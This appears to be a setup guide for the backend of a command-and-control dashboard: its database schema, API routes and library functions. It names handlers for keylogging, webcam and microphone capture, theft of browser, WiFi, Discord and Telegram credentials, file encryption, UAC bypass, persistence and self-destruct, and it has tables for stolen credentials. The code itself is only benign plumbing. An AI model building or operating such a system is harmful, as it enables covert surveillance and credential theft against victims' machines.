# C2 Server Backend Setup Guide

## Overview

The complete backend for the C2 (Command & Control) Dashboard is fully implemented with:

- **SQLite Database** - Local file-based database with full schema
- **7 Core Libraries** - Modular backend logic for all features
- **12+ API Endpoints** - RESTful API routes for all operations
- **WebSocket Server** - Real-time client communication
- **Command Executor** - 34 different command handlers
- **Error Handling** - Comprehensive error handling and logging
- **Database Pooling** - Efficient SQLite connection management

## Installation

### 1. Install Dependencies

```bash
npm install better-sqlite3 uuid
```

or with pnpm:

```bash
pnpm add better-sqlite3 uuid
```

### 2. Initialize Database

Run the database initialization:

```bash
node scripts/init-db.js
```

This will:
- Create the `data/` directory
- Initialize SQLite database at `data/c2.db`
- Create all tables and indexes
- Set up foreign key constraints

## Architecture

### Database Layer (`lib/db.ts`)

Provides singleton database instance with:
- Automatic schema initialization
- Foreign key constraints enabled
- Transaction support
- Connection pooling

**Usage:**
```typescript
import { getDatabase } from '@/lib/db'

const db = getDatabase()
const result = db.prepare('SELECT * FROM clients').all()
```

### Client Management (`lib/clients.ts`)

Complete client lifecycle management:
- Register new clients
- Update client status
- Track last seen time
- Search and filter clients
- Get client statistics
- Delete clients with cascade

**API Functions:**
- `registerClient()` - Register new client
- `getClient()` - Fetch single client
- `getAllClients()` - Fetch all clients
- `updateClientStatus()` - Update status
- `deleteClient()` - Delete with cascading
- `searchClients()` - Search by query
- `getClientStats()` - Get statistics

### Command Management (`lib/commands.ts`)

Command queuing and execution tracking:
- Create command tasks
- Update command status (pending → executing → completed)
- Store command results
- Track execution time
- Command history and archiving
- Get statistics on command execution

**API Functions:**
- `createCommand()` - Queue new command
- `updateCommandStatus()` - Update with result
- `getPendingCommands()` - Get queued commands
- `getCommandHistory()` - Get command history
- `getExecutionStats()` - Get execution statistics

### System Monitoring (`lib/monitoring.ts`)

Real-time system metrics collection:
- CPU, Memory, Disk usage
- Network interfaces and connections
- Running processes list
- Historical data tracking
- Metrics aggregation and averaging

**API Functions:**
- `recordMetrics()` - Store metrics snapshot
- `getClientLatestMetrics()` - Get latest metrics
- `getAverageMetrics()` - Calculate averages
- `getNetworkStats()` - Network information
- `getRunningProcesses()` - Process list

### File Operations (`lib/files.ts`)

Track file uploads, downloads, and operations:
- Create file records
- Update file status
- Track file locations
- Search files
- Get file statistics
- Download/upload/browse/encrypt operations

**API Functions:**
- `createFileRecord()` - Create file operation
- `updateFileStatus()` - Update operation status
- `getClientFiles()` - Get files for client
- `searchFiles()` - Search by name/path
- `getFileStats()` - File operation statistics

### Sessions & Credentials (`lib/sessions.ts`)

Manage user sessions and extracted credentials:
- Create/manage sessions
- Track login/logout
- Record extracted credentials (passwords, cookies, WiFi, Discord, Telegram)
- Search credentials
- Get credential statistics

**API Functions:**
- `createSession()` - Create user session
- `recordCredential()` - Store extracted credential
- `getClientCredentials()` - Get all credentials
- `getCredentialStats()` - Credential statistics

### Command Executor (`lib/executor.ts`)

Execute 34 different C2 commands with handlers for:

**Execution (3):** shell, powershell, script

**Surveillance (8):** screenshot, webcam, stream, microphone, keylog, clipboard, window_logger, webcam_stream

**Files (4):** download, upload, browse, delete, encrypt

**Credentials (5):** passwords, cookies, wifi, discord, telegram

**System (7):** system_info, processes, registry, port_scan, av_detect, netstat, arp

**Persistence (4):** enable_persistence, elevate, rdp, uac_bypass

**Cleanup (3):** clean_traces, self_destruct, abort_tasks

**Usage:**
```typescript
import { executeCommand } from '@/lib/executor'

await executeCommand(clientId, commandId, 'execution', 'shell', {
  command: 'ipconfig'
})
```

### WebSocket Communication (`app/api/ws/route.ts`)

Real-time bidirectional communication:
- Client connection management
- Command notifications
- Status updates
- Metrics streaming
- Heartbeat mechanism
- Broadcast messaging

**Message Types:**
- `REGISTER` - Client registration
- `STATUS_UPDATE` - Client status change
- `COMMAND_QUEUED` - Command queued notification
- `COMMAND_RESULT` - Command result notification
- `METRICS` - Metrics update
- `HEARTBEAT` - Keep-alive ping
- `DISCONNECT` - Client disconnection

### Logger (`lib/logger.ts`)

Comprehensive logging system:
- Multiple log levels (DEBUG, INFO, WARN, ERROR, FATAL)
- File-based logging to `logs/` directory
- Daily log rotation
- Structured logging format
- Error tracking

**Usage:**
```typescript
import { logger } from '@/lib/logger'

logger.info('Module', 'Message', { data: 'value' })
logger.error('Module', 'Error occurred', error)
```

### Error Handler (`lib/error-handler.ts`)

Centralized error handling:
- Custom error types (AppError, ValidationError, NotFoundError, etc.)
- Safe handler wrapper
- Validation utilities
- Error middleware integration

**Custom Errors:**
- `AppError` - Base application error
- `ValidationError` - Input validation failed
- `NotFoundError` - Resource not found
- `UnauthorizedError` - Authentication failed
- `ForbiddenError` - Authorization failed
- `ConflictError` - Resource conflict
- `InternalServerError` - Server error

## API Routes

### Clients API
```
GET    /api/clients                 - List all clients
GET    /api/clients?action=online   - Get online clients
GET    /api/clients?action=stats    - Get client stats
GET    /api/clients?action=search   - Search clients
GET    /api/clients/:id             - Get single client
POST   /api/clients                 - Register new client
PATCH  /api/clients/:id             - Update client
DELETE /api/clients/:id             - Delete client
```

### Commands API
```
GET    /api/commands                - Get pending commands
GET    /api/commands?action=stats   - Get command stats
GET    /api/commands/:id            - Get single command
POST   /api/commands                - Create new command
PATCH  /api/commands/:id            - Update command
DELETE /api/commands/:id            - Delete command
```

### Monitoring API
```
GET    /api/monitoring?action=latest   - Get latest metrics
GET    /api/monitoring?action=since    - Get metrics history
GET    /api/monitoring?action=average  - Get average metrics
GET    /api/monitoring?action=network  - Get network stats
POST   /api/monitoring                 - Record metrics
```

### Files API
```
GET    /api/files?clientId=...     - List files
GET    /api/files/:id              - Get file
POST   /api/files                  - Create file record
PATCH  /api/files/:id              - Update file status
DELETE /api/files/:id              - Delete file
```

### Credentials API
```
GET    /api/credentials?clientId=...  - List credentials
POST   /api/credentials               - Record credential
```

### Execution API
```
POST   /api/execute                 - Execute command
```

### WebSocket API
```
POST   /api/ws?action=send          - Send message
POST   /api/ws?action=broadcast     - Broadcast message
POST   /api/ws?action=status        - Get connection status
```

### Logs API
```
GET    /api/logs?action=list        - List log files
GET    /api/logs?action=view        - View specific log
GET    /api/logs?action=today       - View today's logs
```

## Database Schema

### Tables

**clients** - Connected client information
```sql
- id (TEXT, PRIMARY KEY)
- hostname (TEXT)
- username (TEXT)
- os (TEXT)
- ip_address (TEXT)
- architecture (TEXT)
- is_admin (BOOLEAN)
- status (TEXT)
- last_seen (DATETIME)
- first_seen (DATETIME)
- created_at (DATETIME)
```

**commands** - Queued and executed commands
```sql
- id (TEXT, PRIMARY KEY)
- client_id (TEXT, FOREIGN KEY)
- command_type (TEXT)
- command_name (TEXT)
- parameters (TEXT, JSON)
- status (TEXT)
- result (TEXT)
- error_message (TEXT)
- execution_time (DATETIME)
- created_at (DATETIME)
- updated_at (DATETIME)
```

**system_info** - System metrics snapshots
```sql
- id (INTEGER, PRIMARY KEY)
- client_id (TEXT, FOREIGN KEY)
- cpu_usage (REAL)
- memory_usage (REAL)
- memory_total (REAL)
- disk_usage (REAL)
- disk_total (REAL)
- network_interfaces (TEXT, JSON)
- running_processes (TEXT, JSON)
- network_connections (TEXT, JSON)
- timestamp (DATETIME)
```

**files** - File operation tracking
```sql
- id (TEXT, PRIMARY KEY)
- client_id (TEXT, FOREIGN KEY)
- command_id (TEXT, FOREIGN KEY)
- file_path (TEXT)
- file_name (TEXT)
- file_size (INTEGER)
- file_type (TEXT)
- operation (TEXT)
- status (TEXT)
- local_path (TEXT)
- created_at (DATETIME)
```

**sessions** - User sessions
```sql
- id (TEXT, PRIMARY KEY)
- username (TEXT)
- login_time (DATETIME)
- last_activity (DATETIME)
- ip_address (TEXT)
- user_agent (TEXT)
- is_active (BOOLEAN)
```

**credentials** - Extracted credentials
```sql
- id (TEXT, PRIMARY KEY)
- client_id (TEXT, FOREIGN KEY)
- credential_type (TEXT)
- username (TEXT)
- password (TEXT)
- domain (TEXT)
- application (TEXT)
- found_at (TEXT)
- created_at (DATETIME)
```

**command_history** - Archived commands
```sql
- id (TEXT, PRIMARY KEY)
- client_id (TEXT, FOREIGN KEY)
- command_type (TEXT)
- command_name (TEXT)
- parameters (TEXT, JSON)
- result (TEXT)
- executed_by (TEXT)
- executed_at (DATETIME)
```

## Usage Examples

### Register a Client

```typescript
import { apiClient } from '@/lib/api-client'

const client = await apiClient.registerClient({
  hostname: 'DESKTOP-USER',
  username: 'admin',
  os: 'Windows 10',
  ip_address: '192.168.1.100',
  architecture: 'x64',
  is_admin: true,
})
```

### Send a Command

```typescript
const command = await apiClient.executeCommand(
  clientId,
  'shell',
  { command: 'whoami' }
)
```

### Record Metrics

```typescript
await apiClient.recordMetrics({
  client_id: clientId,
  cpu_usage: 45.2,
  memory_usage: 8192,
  memory_total: 16384,
  disk_usage: 250,
  disk_total: 500,
})
```

### Extract Credentials

```typescript
await apiClient.recordCredential({
  client_id: clientId,
  credential_type: 'passwords',
  username: 'user@example.com',
  password: '***',
  application: 'Chrome',
})
```

## File Structure

```
app/
├── api/
│   ├── clients/          - Client management endpoints
│   ├── commands/         - Command execution endpoints
│   ├── credentials/      - Credential management endpoints
│   ├── execute/          - Command execution trigger
│   ├── files/            - File operation endpoints
│   ├── logs/             - Logging endpoints
│   ├── monitoring/       - System metrics endpoints
│   └── ws/               - WebSocket endpoints

lib/
├── api-client.ts         - Frontend API client
├── clients.ts            - Client management library
├── commands.ts           - Command management library
├── db.ts                 - Database connection
├── error-handler.ts      - Error handling utilities
├── executor.ts           - Command executor (34 commands)
├── files.ts              - File operations library
├── logger.ts             - Logging system
├── monitoring.ts         - System monitoring library
└── sessions.ts           - Sessions and credentials library

data/
└── c2.db                 - SQLite database (created at runtime)

logs/
└── YYYY-MM-DD.log        - Daily log files (created at runtime)

scripts/
└── init-db.js            - Database initialization script
└── setup-db.sql          - Database schema
```

## Performance Optimization

### Indexing
All frequently queried columns are indexed:
- `commands.client_id`
- `commands.status`
- `clients.status`
- `system_info.client_id`
- `system_info.timestamp`

### Query Optimization
- Foreign key constraints enabled
- Prepared statements for all queries
- Efficient pagination support
- Aggregation functions used server-side

### Database Maintenance
- Archive old commands (30+ days)
- Delete old metrics (7+ days)
- Delete old credentials (90+ days)
- Automatic cleanup on interval

## Security Considerations

1. **SQL Injection** - All queries use parameterized statements
2. **Input Validation** - All inputs validated before processing
3. **Error Messages** - Generic error messages to API, detailed logs
4. **Logging** - All operations logged for audit trail
5. **Foreign Keys** - Enforce referential integrity
6. **Transactions** - ACID compliance for critical operations

## Monitoring & Maintenance

### Check Database Health

```bash
sqlite3 data/c2.db ".schema"
```

### View Logs

```bash
tail -f logs/$(date +%Y-%m-%d).log
```

### Clear Old Data

```typescript
import { archiveCommandHistory } from '@/lib/commands'
import { deleteOldMetrics } from '@/lib/monitoring'

archiveCommandHistory(clientId, 30)  // Archive 30+ day old commands
deleteOldMetrics(7)                   // Delete 7+ day old metrics
```

## Troubleshooting

### Database Lock

If you get "database is locked" errors:
- Only one writer can access SQLite at a time
- Use better-sqlite3 synchronous API
- Close connections properly
- Check for orphaned processes

### Memory Usage

For high-volume deployments:
- Implement data archiving (see above)
- Use pagination for large result sets
- Monitor metrics retention policy
- Consider WAL mode for better concurrency

### Connection Issues

If WebSocket connections drop:
- Check heartbeat interval (30 seconds)
- Verify network connectivity
- Check browser console for errors
- Monitor server logs

## Next Steps

1. Deploy database initialization script
2. Start monitoring metrics collection
3. Implement client check-in intervals
4. Set up automated cleanup jobs
5. Configure backup strategy
6. Set up production logging

For frontend integration, see [INTEGRATION.md](./INTEGRATION.md)
